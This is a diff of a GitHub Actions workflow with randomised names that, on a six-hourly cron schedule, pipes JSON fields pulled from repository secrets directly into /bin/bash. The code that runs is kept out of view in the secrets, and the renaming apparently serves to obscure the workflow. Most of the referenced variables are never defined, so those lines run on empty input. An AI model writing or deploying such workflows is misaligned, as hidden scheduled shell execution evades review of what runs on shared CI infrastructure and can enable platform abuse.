@@ -1,24 +1,26 @@
 name: yunbuxing3456
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
-
-jobs:  # 13885
+    - cron: '19 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yunbuxing3456
         env:
-          bicri993: ${{ secrets.bicri993 }}
+          jnhr5144: ${{ secrets.jnhr5144 }}
         run: |
-          echo $bicri993 | jq -r .wwpuq0077 | /bin/bash
-          echo $zixs60503 | jq -r .swes03 | /bin/bash
-          echo $a6 | jq -r .qnqy136 | /bin/bash
-          echo $yewe85 | jq -r .n407 | /bin/bash
-          echo $gwz41634 | jq -r .gwa10806 | /bin/bash
-          echo $c598 | jq -r .iewz6101 | /bin/bash
-          echo $rom1 | jq -r .tim4223 | /bin/bash
+          echo $jnhr5144 | jq -r .tqfl008 | /bin/bash
+          echo $ustuo4852 | jq -r .bth71 | /bin/bash
+          echo $zijf6 | jq -r .qkrft48814 | /bin/bash
+          echo $ophcl31208 | jq -r .s4152 | /bin/bash
+          echo $zs64 | jq -r .ogl085 | /bin/bash
+          echo $si6852 | jq -r .ncmdu12460 | /bin/bash
+          echo $yuo2756 | jq -r .n7760 | /bin/bash
+          echo $diay309 | jq -r .obmyb858 | /bin/bash
+          echo $cc03 | jq -r .kb275 | /bin/bash
+          echo $ufkl3340 | jq -r .oova3 | /bin/bash
 
